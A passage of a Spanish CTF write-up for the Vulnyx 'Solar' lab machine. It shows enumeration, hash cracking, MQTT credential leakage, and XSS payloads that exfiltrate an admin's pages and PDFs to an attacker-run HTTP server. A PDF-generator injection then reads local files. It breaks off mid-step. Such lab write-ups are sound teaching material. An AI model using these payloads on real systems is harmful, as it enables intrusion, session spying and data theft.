---
author: Lenam  
pubDatetime: 2024-10-23T15:22:00Z  
title: WriteUp Solar - Vulnyx  
slug: solar-writeup-vulnyx-es  
featured: false  
draft: false  
ogImage: "../../../assets/images/solar/OpenGraph.png"  
tags:  
  - writeup  
  - vulnyx
  - xss
  - rce
  - lfi
  - session-spying
  - password-cracking
  - cron
  - doas
  - mqtt
  - pdf-injection
  - gpg
  - nodejs
description:  
  A continuación, se describe el proceso esperado para la vulneración del CTF Solar de Vulnyx. Una maquina laboriosa y que necesita paciencia.
lang: es  
---

A continuación, se describe el proceso esperado para la vulneración del CTF Solar de Vulnyx. Una máquina laboriosa y que necesita paciencia. Seguramente utilizando herramientas como BeeF puede ser más fácil, en este writeup se describe una forma manual de resolverlo.

Espero que sea de vuestro agrado.

![Solar ASCII Art](../../../assets/images/solar/image.png)

## Tabla de contenido 

## Enumeración

### nmap

La IP del objetivo en este writeup es `192.168.1.173`, puede la IP ser otra en los ejemplos, ya que este writeup ha sido realizado en distintas partes y la IP asignada fue otra.

```bash
$ nmap -p- -n -Pn 192.168.1.173 -o all_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 02:27 CEST
Nmap scan report for 192.168.1.173
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 3.01 seconds
```

```bash
$ nmap -p22,80,443 -sVC 192.168.1.173 -oN specific_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 02:28 CEST
Nmap scan report for solar.nyx (192.168.1.173)
Host is up (0.00032s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 00:31:c1:0a:8b:0f:c9:45:e7:2f:7f:06:0c:4f:cb:42 (ECDSA)
|_  256 6b:04:c5:5d:39:ed:b3:41:d0:23:2b:77:d1:53:d0:48 (ED25519)
80/tcp  open  http     Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Solar Energy Control Login
| ssl-cert: Subject: commonName=www.solar.nyx/organizationName=Solar/stateOrProvinceName=Madrid/countryName=ES
| Subject Alternative Name: DNS:www.solar.nyx, DNS:www.sunfriends.nyx
| Not valid before: 2024-10-10T00:03:30
|_Not valid after:  2034-10-08T00:03:30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

Añadimos `www.solar.nyx` y `www.sunfriends.nyx` a `/etc/hosts`.

```bash
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.1.173   www.solar.nyx www.sunfriends.nyx
```

Si intentamos acceder al puerto 80, se nos dirige a `https://www.solar.nyx`, pero podemos ver dos sitios web con certificado SSL autofirmado por el puerto 443.

**www.solar.nyx**

![www.solar.nyx](../../../assets/images/solar/image-1.png)

**www.sunfriends.nyx**

![www.sunfriends.nyx](../../../assets/images/solar/image-2.png)

### Fuzzing

**www.solar.nyx**

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.solar.nyx -x php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.solar.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 745]
/login.php            (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.php?msg=Log-out.]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/records              (Status: 301) [Size: 318] [--> https://www.solar.nyx/records/]
/session.php          (Status: 200) [Size: 0]
```

**www.sunfriends.nyx**

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.sunfriends.nyx -x php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.sunfriends.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 284]
/index.php            (Status: 200) [Size: 11089]
/server.php           (Status: 200) [Size: 1523]
/commands             (Status: 301) [Size: 329] [--> https://www.sunfriends.nyx/commands/]
/.php                 (Status: 403) [Size: 284]
/server-status        (Status: 403) [Size: 284]
```

Dado que aparece el mensaje:

```text 
The forum is temporarily unavailable due to maintenance on the server.
We apologize for the inconvenience. 
```
Realizamos fuzzing para ver si encontramos alguna base de datos, backup o fichero que estén utilizando durante el mantenimiento.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.sunfriends.nyx -x txt,db,sql,gz,sql.gz,sqlite,rar,tar,zip,gzip,gz2 -k

... or ...

$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt -u https://www.sunfriends.nyx -x txt,db,sql,gz,sql.gz,sqlite,rar,tar,zip,gzip,gz2 -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.sunfriends.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sql.gz,rar,tar,zip,txt,db,gz,gz2,sql,sqlite,gzip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/database.sql.gz      (Status: 200) [Size: 1147]
Progress: 4032 / 4044 (99.70%)
===============================================================
Finished
===============================================================
```

Encontramos el archivo https://www.sunfriends.nyx/database.sql.gz, lo descargamos, lo descomprimimos y encontramos una base de datos con los siguientes datos de usuarios.

## Cracking hash

En el backup de la base de datos encontramos.

```sql
INSERT INTO `users` VALUES
(1,'Robert24','66dc8ac996672de0cdeb294808d4cca21ba0bc856c365e90562565853febed0c','user'),
(2,'calvin','e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879','user'),
(3,'JulianAdm','bbca1b30190fddeead4e1a845ee063bec94499601aa5ee795da8917767bdcdde','admin'),
(4,'John20','38858f3066c9a6f3d8c6e54fbfcff204d5383f0721c32bc8ae46cf46a93e3694','user');
```

Solo logramos crackear el hash del usuario **calvin**, el resto de contraseñas parecen ser seguras.

```bash
$ echo e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879 > hash-calvin
$ hashcat ./hash-calvin
$ hashcat -m 1400 hash-calvin /usr/share/wordlists/rockyou.txt
$ hashcat -m 1400 hash-calvin /usr/share/wordlists/rockyou.txt --show
e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879:emily
```

En poco tiempo obtenemos la contraseña `emily`, por lo que accedemos al formulario en `www.solar.nyx` con las credenciales `calvin:emily`.

## XSS a través de MQTT

Analizamos el código de https://www.solar.nyx/dashboard.php.

![www.solar.nyx/dashboard.php](../../../assets/images/solar/image-3.png)


```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solar Energy Dashboard</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style2.css">
</head>

<body>
    <div class="dashboard">
        <object class="solar-icon" data="sun.svg" type="image/svg+xml" style="width:75px;"></object>
        <h1>Solar Energy Dashboard</h1>
        <div class="user-info" id="userInfo"><span>User Name</span><br>Role</div>
        <canvas id="energyChart" class="energy-chart"></canvas>
        <div class="energy-label"><span class="solar-title">Solar:</span> <span id="solarEnergyLabel"
                class="energy-value solar">0 kWh</span></div>
        <div class="energy-label"><span class="consumed-title">Consumed:</span> <span id="consumedEnergyLabel"
                class="energy-value consumed">0 kWh</span></div>
        <div class="energy-label"><span class="grid-title">Grid:</span> <span id="gridEnergyLabel"
                class="energy-value grid-positive">0 kWh</span></div>
        <a href="/logout.php" class="logout-link" id="logoutLink">Logout</a>
            </div>

    <!--<script src="/mqtt.min.js"></script>-->
    
    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'
        
        let userName = "calvin";
        let userRole = "user";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;
            

            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);

    
    </script>
</body>

</html>
```

Parece que hay un broker MQTT accesible mediante websockets en el puerto 443 y en el endpoint `wss://www.solar.nyx/wss/`. Además, en el mismo código se muestran las credenciales para conectarnos al broker MQTT:

```javascript
...
        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });
...
``` 

También observamos que los datos se reciben del topic `data` y se muestran en el dashboard en tiempo real. Estos datos corresponden a la producción de energía solar y el consumo eléctrico de la instalación comunitaria.

```javascript
...
        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });
...
```

Nos conectamos al servidor mediante un cliente MQTT y nos suscribimos al topic `#`, lo que nos permitirá recibir los datos de todos los topics a los que el usuario tenga acceso. Podemos utilizar cualquier cliente que permita conexiones por websockets, pero para facilitar el trabajo utilizamos MQTTX, que tiene GUI y está disponible para diferentes plataformas.

https://mqttx.app/downloads
https://github.com/emqx/MQTTX

![Configuración MQTT user](../../../assets/images/solar/image-4.png)

Vemos que empezamos a recibir en el cliente MQTT los mismos datos que en el dashboard.

![alt text](../../../assets/images/solar/image-4-old.png)

Si publicamos datos en el topic `data`, veremos cómo se reflejan en el `dashboard.php`.

![alt text](../../../assets/images/solar/image-5-old.png) 

Enviamos un dato de consumo muy alto y vemos cómo las barras del gráfico se mueven. En el código de la página, observamos que podemos realizar un XSS (Cross-Site Scripting), ya que se utiliza solo `innerHTML` sin sanitizar el contenido de las propiedades `solarEnergy` y `consumedEnergy` del JSON enviado.

```javascript
...
            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;
...
``` 

Podemos enviar un JSON como el siguiente y ejecutar cualquier JavaScript en la página `dashboard.php` en la parte del cliente/navegador.

```json
{
  "solarEnergy": "<img src=x onerror=eval(atob(\/[base64encodeJavascriptCode]\/.source)); />",
  "consumedEnergy": 15
}
```

Vemos que la cookie de sesión está configurada como `HttpOnly`, `Secure` y con la política `SameSite` como `Strict`. No encontramos ningún lugar en el servidor donde se muestren las cabeceras (como el típico `phpInfo();`). Será muy difícil robar la cookie de otro usuario, pero podemos intentar visualizar lo que él está viendo, ya que las cabeceras CSP no están configuradas.

Según las conversaciones del foro `www.sunfriends.nyx`, es muy posible que el usuario `JulianAdm` esté visualizando el Dashboard.

Levantamos un servidor en el puerto 80 con Python:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y enviamos el siguiente `JSON` mediante `MQTTX` al topic `data` con nuestra dirección IP:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?url='+encodeURIComponent(window.location.href)+'&code='+btoa(document.body.outerHTML);})();\"; />",
  "consumedEnergy": 15
}
```

Recibimos al menos dos peticiones en nuestro servicio HTTP en el puerto 80, una desde nuestra IP y otra desde la IP de la máquina.

```bash
192.168.1.168 - - [03/Sep/2024 00:18:34] "GET /?url=https%3A%2F%2Fwww.solar.nyx%2Fdashboard.php&code=PGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJkYXNoYm9hcmQiPgogICAgICAgIDxvYmpl ... ZW50LmdldEVsZW1lbnRCeUlkKCdzZW5kLXJlY29yZC1pZCcpLm9uY2xpY2sgPSBzZW5kcmVjb3JkOwogICAgCiAgICA8L3NjcmlwdD4KCgo8L2JvZHk+ HTTP/1.1" 200 -
```

Si descodificamos el base64, obtendremos el siguiente código:

```html
<body>
    <div class="dashboard">
        <object class="solar-icon" data="sun.svg" type="image/svg+xml" style="width:75px;"></object>
        <h1>Solar Energy Dashboard</h1>
        <div class="user-info" id="userInfo"><span>JulianAdm</span><br>admin</div>
        <canvas id="energyChart" class="energy-chart" width="400" height="200" style="display: block; box-sizing: border-box; height: 200px; width: 400px;"></canvas>
        <div class="energy-label"><span class="solar-title">Solar:</span> <span id="solarEnergyLabel" class="energy-value solar"><span class="energy-value solar"><img src="x" onerror="(async () => {location.href='http://192.168.1.116?url='+encodeURIComponent(window.location.href)+'&amp;code='+btoa(document.body.outerHTML);})();" ;=""> kWh</span></span></div>
        <div class="energy-label"><span class="consumed-title">Consumed:</span> <span id="consumedEnergyLabel" class="energy-value consumed"><span class="energy-value consumed">15 kWh</span></span></div>
        <div class="energy-label"><span class="grid-title">Grid:</span> <span id="gridEnergyLabel" class="energy-value grid-positive"><span class="energy-value grid-positive">NaN kWh</span></span></div>
        <a href="/logout.php" class="logout-link" id="logoutLink">Logout</a>
                    <a href="/records/" class="logout-link">Records</a>
            <a href="#" class="logout-link" id="send-record-id">Send record</a>
            </div>

    <!--<script src="/mqtt.min.js"></script>-->
    
    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'
        
        let userName = "JulianAdm";
        let userRole = "admin";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;
            

            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);

            // Show message
            function showMessage(msg) {
                const mensajeDiv = document.createElement('div');
                mensajeDiv.classList.add("temp-message")
                mensajeDiv.textContent = msg;
                document.body.appendChild(mensajeDiv);
                setTimeout(() => {
                    mensajeDiv.remove();
                }, 3000);
            }

            // Function to send the record 
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';


                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
    
    </script>


</body>
```

Podemos observar varias diferencias en este código.

La página pertenece al usuario `JulianAdm` que vimos en la base de datos y en el foro, pero no pudimos crackear su contraseña. Además, pertenece al rol de `admin`.

```javascript
...
        let userName = "JulianAdm";
        let userRole = "admin";
...
```

Obtenemos unas credenciales diferentes para conectar con el servicio MQTT: `admin:tJH8HvwVwC57BR6CEyg5`. Las utilizamos para conectarnos con el cliente MQTT.

```javascript
...
        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });
...
```

Algo interesante es que hay una función que parece publicar información en el topic `record`.

```javascript
...
            // Function to send the record 
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';


                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
...
```

Esta función crea una imagen del gráfico de barras en base64 y, junto con otros datos, los envía en un JSON al topic `record` cuando el usuario hace clic en el botón `#send-record-id`.

También encontramos otra dirección accesible mediante un enlace: `/records/`. Esta dirección no es accesible para el usuario `calvin`, ya que no tiene el rol de administrador.

Nos suscribimos a todos los topics (`#`) utilizando las credenciales `admin:tJH8HvwVwC57BR6CEyg5`, y enviamos el siguiente JSON al topic `data`:

```json
{
  "solarEnergy": "<img src=x onerror=\"document.querySelector(`#send-record-id`).dispatchEvent(new Event('click'));\" />",
  "consumedEnergy": 15
}
```

Recibimos el siguiente JSON en el topic `record`:

```json
{"time":"2024-09-02T22:43:52.187Z","user":{"name":"JulianAdm","role":"admin"},"solar":"<img src=x onerror=\"document.querySelector(`#send-record-id`).dispatchEvent(new Event('click'));\" />","consumed":15,"grid":null,"chart":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAADICAYAAADGFbfiAAAgAElEQVR4Xu2dC3QV1b3GgYQYoAUSsMqjRVp5WAsWHwgVV6Mi2tt7aanGFwYDiAnPolXx ... BIgf8D+epLMhrp9ocAAAAASUVORK5CYII="}
```

Los mensajes enviados al topic `data` con el XSS se eliminan al recibir nuevos datos cada 2 segundos.

Intentamos publicar datos en el topic `record` con el usuario `admin` del servicio MQTT y no tenemos problemas, podemos hacerlo. Así que intentamos introducir otro XSS en el parámetro `chart` del JSON, intuyendo que será introducido en el atributo `src` de una etiqueta `<img>` de HTML:

```json
{
  "time": "2024-09-02T23:25:15.855Z",
  "user": {
    "name": "JulianAdm",
    "role": "admin"
  },
  "solar": 211,
  "consumed": 168,
  "grid": -43,
  "chart": "\"><h1>XSS</h1></"
}
```

Por otro lado, intentamos obtener la página alojada en `/records/`. Parece tener relación con este nuevo topic. Volvemos a levantar el servicio HTTP en el puerto 80 en nuestra máquina:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

y enviamos el siguiente JSON al topic `data`:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => { location.href='http://192.168.1.116/?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/')).arrayBuffer())));})(); \" />",
  "consumedEnergy": 15
}
```

Obtenemos en nuestro servicio HTTP la siguiente petición:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 01:32:57] "GET /?data=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+TGlzdCBvZiBTb2xhciBFbmVyZ3kgRGF0YTwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9zdHlsZS5jc3MiPgogICAgPGxpbmsgcmVsPSJ ... RG93bmxvYWQgUERGPC9hPgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgPGEgaHJlZj0iLi4vZGFzaGJvYXJkLnBocCIgY2xhc3M9ImxvZ291dC1saW5rIj4mbHQ7IEJhY2s8L2E+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPg== HTTP/1.1" 200 -
```

Decodificamos el base64 y encontramos el siguiente código de la página `/records/`:

```html
<!DOCTYPE html>
<html>

<head>
    <title>List of Solar Energy Data</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style3.css">
</head>

<body>
    <div style="min-width:400px;background:white;padding:15px;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <div style="text-align:center;"><object class="solar-icon" data="../sun.svg" type="image/svg+xml" style="width:75px;"></object></div>
        <h1>List of Solar Energy Data</h1>
        <table>
            <tr>
                <th>Record</th>
                <th>Actions</th>
            </tr>
                            <tr>
                    <td>2024-09-02T23:04:27.035Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A04%3A27.035Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:09:07.758Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A09%3A07.758Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                ...

                            <tr>
                    <td>2024-09-02T23:29:26.645Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A29%3A26.645Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                    </table>
        <a href="../dashboard.php" class="logout-link">&lt; Back</a>
    </div>
</body>
</html>
```

Obtenemos un listado de registros en formato PDF para descargar. Nunca aparecerán más de 10 registros y, por cada mensaje enviado al topic `record`, aparecerá un PDF para descargar en este listado.

## XSS en PDF a LFI a través de MQTT

Descargamos algunos de esos ficheros utilizando la misma técnica. Seguimos a la escucha con nuestro servicio HTTP y enviamos el siguiente JSON al topic `data`, introduciendo las URLs de descarga de los ficheros PDF.

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/?download=true&file=2024-09-02T23%3A29%3A26.645Z.json')).arrayBuffer())));})();\" />",
  "consumedEnergy": 15
}
```

Esta vez guardamos el base64 en un fichero `base64pdf1.txt`, por ejemplo.

```bash
cat base64pdf1.txt | base64 -d > document.pdf
```

Si visualizamos el documento, podremos ver la inyección XSS enviada.

![PDF XSS](../../../assets/images/solar/image-6.png)

```bash
─$ exiftool document.pdf     
ExifTool Version Number         : 12.76
File Name                       : document.pdf
Directory                       : .
File Size                       : 20 kB
File Modification Date/Time     : 2024:09:03 01:46:09+02:00
File Access Date/Time           : 2024:09:03 01:46:19+02:00
File Inode Change Date/Time     : 2024:09:03 01:46:09+02:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Solar Energy Data
Creator                         : wkhtmltopdf 0.12.6.1
Producer                        : Qt 4.8.7
Create Date                     : 2024:09:02 19:43:43-04:00
Page Count                      : 1
Page Mode                       : UseOutlines
```

Podemos observar que son documentos creados con `wkhtmltopdf 0.12.6.1`, el cual tiene el CVE `CVE-2022-35583`, pero este no será el caso.

Intentamos un LFI, pero no lo conseguimos con el fichero `/etc/passwd`, aunque sí lo logramos con algunos ficheros PHP de los servicios web.

### Paso 1

Enviamos el siguiente `JSON` al topic `record` mediante el cliente MQTT utilizando el usuario `admin:tJH8HvwVwC57BR6CEyg5` para intentar leer el fichero `/var/www/solar.nyx/records/index.php` del servidor:

```json
{
  "time": "2024-07-13T00:07:36.621Z",
  "user": {
    "name": "JulianAdm",
    "role": "admin"
  },
  "solar": 232,
  "consumed": 223,
  "grid": -9,
  "chart": "\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
}
```

Podemos modificar la variable `p='/var/www/solar.nyx/records/index.php'` para seleccionar otros ficheros.

Comprobamos que el payload fue enviado correctamente al topic `record` desde el cliente MQTT.

### Paso 2

Volvemos a obtener en nuestro servicio HTTP el listado de los últimos `/records/`, enviando el siguiente JSON al topic `data`:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => { location.href='http://192.168.1.116/?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/')).arrayBuffer())));})(); \" />",
  "consumedEnergy": 15
}
```

Decodificamos el base64 del parámetro `data` recibido:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 02:04:35] "GET /?data=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU ... gICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgPGEgaHJlZj0iLi4vZGFzaGJvYXJkLnBocCIgY2xhc3M9ImxvZ291dC1saW5rIj4mbHQ7IEJhY2s8L2E+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPg== HTTP/1.1" 200 -
```

Obtenemos la programación HTML del cliente y buscamos el último enlace al PDF.

```html
<td>
    <td>2024-09-03T00:22:27.568Z</td>
    <td>
        <a href="?download=true&file=2024-09-03T00%3A22%3A27.568Z.json" class="download-btn">Download PDF</a>
    </td>
</td>
```

### Paso 3

Enviamos el siguiente JSON al topic `data` para obtener en nuestro servicio HTTP el fichero PDF de la URL obtenida en el paso anterior. En nuestro caso, `/records/?download=true&file=2024-09-03T00%3A22%3A27.568Z.json`.

```json
{
